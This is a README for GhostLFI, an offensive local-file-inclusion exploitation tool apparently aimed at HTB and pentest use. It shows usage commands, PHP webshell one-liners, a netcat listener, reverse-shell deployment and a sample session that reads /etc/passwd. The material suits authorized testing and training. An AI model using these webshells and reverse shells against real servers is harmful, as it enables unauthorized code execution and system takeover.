# 👻 GhostLFI - Local File Inclusion Exploitation Framework
## Ghost Ops Security | The ONE Tool You Need

```
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗     ███████╗██╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║     ██╔════╝██║
  ██║  ███╗███████║██║   ██║███████╗   ██║   ██║     █████╗  ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║     ██╔══╝  ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████╗██║     ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
```

---

## ⚡ Quick Start (30 Seconds)

```bash
# Install
pip3 install requests urllib3 colorama

# Run
python3 ghostlfi.py -u http://target.com/page.php -p file --auto
```

**Done!** GhostLFI automatically:
1. ✅ Checks PHP configuration
2. ✅ Tests for LFI
3. ✅ Tests all wrappers
4. ✅ Finds RCE
5. ✅ Asks what you want to do

---

## 🌟 What is GhostLFI?

**ONE file with EVERYTHING:**

✅ **Payload Generation** → LFI, wrappers, shells, revshells
✅ **Wrapper Testing** → expect://, data://, php://input
✅ **HTB Academy** → 100% technique coverage
✅ **Bypass Techniques** → Null byte, encoding, traversal
✅ **Log Poisoning** → Apache, Nginx automatic
✅ **Session Poisoning** → PHP session exploitation
✅ **Interactive Shell** → With built-in generators
✅ **Reverse Shell** → Auto-deployment with prompts
✅ **Auto-Exploit** → Smart testing order

**900 lines. 40KB. ONE file. No dependencies on other tools.**

---

## 📦 What's Included

### 🌟 **THE MAIN TOOL**
```
ghostlfi.py (40KB) - Everything in ONE file
  └─ READ: GHOSTLFI_GUIDE.md
```

### 📚 **Documentation** (11 guides)
```
GHOSTLFI_GUIDE.md         - Complete GhostLFI guide (START HERE!)
START_HERE.md             - Quick start for beginners
LFI_EXPLOITER_GUIDE.md    - Alternative unified tool
PHP_WRAPPERS_GUIDE.md     - HTB Academy techniques
WORKFLOW_DIAGRAM.txt      - Visual flowcharts
QUICK_REFERENCE.txt       - Command cheat sheet
ULTIMATE_GUIDE.md         - Previous version guide
FINAL_SUMMARY.md          - Package overview
CHANGELOG.md              - What's new
TOOLKIT_SUMMARY.md        - Feature comparison
USAGE_GUIDE.md            - All tools documentation
```

### 🔧 **Alternative Tools** (Optional)
```
lfi_exploiter.py          - Unified tool (older version)
file_inclusion_tool.py    - Comprehensive framework
wrapper_generator.py      - Command generator
payload_generator.py      - Payload creator
advanced_wrappers.py      - Advanced module
```

**Recommendation:** Just use `ghostlfi.py` - it has everything!

---

## 🚀 Usage Examples

### Auto-Exploit (Most Common)
```bash
python3 ghostlfi.py -u http://target.com/page.php -p file --auto
```

### With Advanced Techniques (Log + Session Poisoning)
```bash
python3 ghostlfi.py -u http://target.com/page.php -p file --auto --advanced
```

### Interactive Shell
```bash
python3 ghostlfi.py -u http://target.com/page.php -p file --auto --shell
```

### Reverse Shell
```bash
# Set up listener first
nc -lvnp 4444

# Deploy reverse shell
python3 ghostlfi.py -u http://target.com/page.php -p file --auto --revshell --lhost 10.10.10.1
```

### Generate Payloads (Built-In!)
```bash
# LFI bypass payloads
python3 ghostlfi.py -u http://target.com/page.php -p file --generate lfi

# PHP wrapper payloads
python3 ghostlfi.py -u http://target.com/page.php -p file --generate wrappers

# Webshells
python3 ghostlfi.py -u http://target.com/page.php -p file --generate shells

# Reverse shells
python3 ghostlfi.py -u http://target.com/page.php -p file --generate revshell
```

### Test Specific Techniques
```bash
# Test LFI bypasses
python3 ghostlfi.py -u http://target.com/page.php -p file --test-bypass

# Test log poisoning
python3 ghostlfi.py -u http://target.com/page.php -p file --test-log-poison

# Test session poisoning
python3 ghostlfi.py -u http://target.com/page.php -p file --test-session-poison
```

### With Burp Suite
```bash
python3 ghostlfi.py -u http://target.com/page.php -p file --auto --proxy http://127.0.0.1:8080
```

---

## 💻 Example Session

```bash
$ python3 ghostlfi.py -u http://target.com/page.php -p file --auto

   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗     ███████╗██╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║     ██╔════╝██║
  ██║  ███╗███████║██║   ██║███████╗   ██║   ██║     █████╗  ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║     ██╔══╝  ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████╗██║     ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝

╔════════════════════════════════════════════════════════════════════╗
║          Local File Inclusion Exploitation Framework             ║
║                    Ghost Ops Security                              ║
╚════════════════════════════════════════════════════════════════════╝

[PHASE 1] PHP Configuration Check
✓ allow_url_include = On

[PHASE 2] LFI Vulnerability Test
✓ LFI vulnerability confirmed!

[PHASE 3.2] Testing data:// Wrapper
✓ data:// wrapper (base64) RCE successful!

[SUCCESS] RCE Achieved!

[?] What would you like to do?
  1) Interactive shell
  2) Reverse shell
  3) Generate payloads
  4) Exit

Choice [1]: 1

ghostops@target:~$ whoami
www-data

ghostops@target:~$ generate shells
[WEBSHELLS]
minimal: <?php system($_GET["cmd"]); ?>
request: <?php system($_REQUEST["cmd"]); ?>

ghostops@target:~$ revshell
Enter your IP: 10.10.10.1
Enter your port: 4444
[+] All payloads sent! Check your listener.
```

---

## 🎯 Interactive Shell Commands

```bash
ghostops@target:~$ whoami                # Any command
ghostops@target:~$ cat /etc/passwd       # Any command

ghostops@target:~$ revshell              # Deploy reverse shell
ghostops@target:~$ generate shells       # Generate webshells
ghostops@target:~$ generate lfi          # Generate LFI payloads
ghostops@target:~$ generate wrappers     # Generate wrapper payloads
ghostops@target:~$ generate revshell     # Generate reverse shells

ghostops@target:~$ exit                  # Exit shell
```

---

## 🎓 HTB Academy Coverage

✅ **Configuration Check** - Reads php.ini, checks settings
✅ **expect:// Wrapper** - Direct command execution
✅ **data:// Wrapper** - Base64 + plain text methods
✅ **php://input Wrapper** - $_GET, $_REQUEST, direct variants
✅ **Testing Order** - HTB Academy recommended sequence
✅ **All Examples** - Every technique from the course

**Plus Advanced Features:**
✅ Log poisoning (Apache, Nginx)
✅ Session poisoning (PHP sessions)
✅ LFI bypass techniques
✅ Integrated payload generation

---

## 📊 Comparison

| Feature | GhostLFI | Multiple Tools |
|---------|----------|----------------|
| **Files** | 1 | 5+ |
| **Size** | 40KB | 100KB+ |
| **Payload Gen** | ✅ Built-in | ❌ Separate tool |
| **Wrapper Test** | ✅ Built-in | ❌ Separate tool |
| **Log Poison** | ✅ Built-in | ❌ Separate tool |
| **Session Poison** | ✅ Built-in | ❌ Separate tool |
| **Interactive Shell** | ✅ With generators | ⚠️ Basic |
| **Reverse Shell** | ✅ Auto-prompt | ⚠️ Manual |
| **Setup** | One command | Multiple commands |
| **Learning Curve** | Easy | Complex |

**Winner:** GhostLFI - Everything in ONE file!

---

## 🔧 Command Reference

```bash
# Auto-exploit
python3 ghostlfi.py -u <URL> -p <param> --auto

# With advanced techniques
python3 ghostlfi.py -u <URL> -p <param> --auto --advanced

# Interactive shell
python3 ghostlfi.py -u <URL> -p <param> --auto --shell

# Reverse shell
python3 ghostlfi.py -u <URL> -p <param> --auto --revshell --lhost <IP>

# Generate payloads
python3 ghostlfi.py -u <URL> -p <param> --generate <lfi|wrappers|shells|revshell>

# Test techniques
python3 ghostlfi.py -u <URL> -p <param> --test-bypass
python3 ghostlfi.py -u <URL> -p <param> --test-log-poison
python3 ghostlfi.py -u <URL> -p <param> --test-session-poison

# With Burp
python3 ghostlfi.py -u <URL> -p <param> --auto --proxy http://127.0.0.1:8080

# Help
python3 ghostlfi.py --help
```

---

## 📖 Documentation Guide

**Start Here:**
1. **README.md** (this file) - Overview
2. **GHOSTLFI_GUIDE.md** - Complete guide

**Learn Techniques:**
3. **PHP_WRAPPERS_GUIDE.md** - HTB Academy techniques
4. **WORKFLOW_DIAGRAM.txt** - Visual guides

**Quick Reference:**
5. **QUICK_REFERENCE.txt** - Cheat sheet
6. **START_HERE.md** - Beginner guide

---

## 🏆 Why GhostLFI?

### You Asked For:
> *"One tool that works together to accomplish the job. Payload generator, wrapper generator, everything. If we find RCE, prompt user for reverse shell with IP and port."*

### You Got:
✅ **ONE file** (ghostlfi.py) with everything
✅ **Payload generation** built-in (--generate)
✅ **Wrapper testing** built-in (automatic)
✅ **All techniques** (HTB + advanced)
✅ **Interactive shell** with generators
✅ **Reverse shell** with automatic prompts
✅ **Professional results** for your reports

```bash
# This is all you need:
python3 ghostlfi.py -u <TARGET> -p <PARAM> --auto
```

---

## 📦 Complete Package (19 Files, 326KB)

**Main Tool:**
- **ghostlfi.py** ⭐ **USE THIS**

**Documentation:** (11 files)
- GHOSTLFI_GUIDE.md ⭐ **READ THIS**
- START_HERE.md, PHP_WRAPPERS_GUIDE.md, WORKFLOW_DIAGRAM.txt
- QUICK_REFERENCE.txt, ULTIMATE_GUIDE.md, FINAL_SUMMARY.md
- LFI_EXPLOITER_GUIDE.md, CHANGELOG.md, TOOLKIT_SUMMARY.md
- USAGE_GUIDE.md

**Alternative Tools:** (5 files - optional)
- lfi_exploiter.py, file_inclusion_tool.py, wrapper_generator.py
- payload_generator.py, advanced_wrappers.py

**Config:**
- requirements.txt

---

## 🚨 Important

### Legal Use Only
- ✅ Your systems
- ✅ HTB/CTF platforms
- ✅ Authorized pentests (written permission)
- ❌ Unauthorized systems

### Best Practices
1. Always get authorization
2. Use `--proxy` with Burp for analysis
3. Start with basic `--auto` before `--advanced`
4. Clean up after testing
5. Document for reports

---

## 🎯 Bottom Line

**GhostLFI = Everything You Need**

```bash
python3 ghostlfi.py -u <TARGET> -p <PARAM> --auto
```

ONE file. ONE command. EVERYTHING integrated.

---

**Ghost Ops Security** | Professional Red Team Operations

*For Authorized Penetration Testing Only*

Always obtain written permission before testing any system.
